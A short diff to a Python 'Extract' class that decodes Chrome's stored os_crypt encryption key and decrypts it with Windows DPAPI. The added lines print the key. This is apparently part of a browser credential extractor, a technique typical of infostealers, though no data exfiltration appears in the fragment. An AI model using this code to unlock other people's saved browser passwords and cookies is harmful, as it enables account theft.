@@ -66,6 +66,8 @@ class Extract:
             encryption_key = base64.b64decode(
                 localstate["os_crypt"]["encrypted_key"])
             
+            print(encryption_key)
+            
             encryption_key = encryption_key[5:]
             return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
         
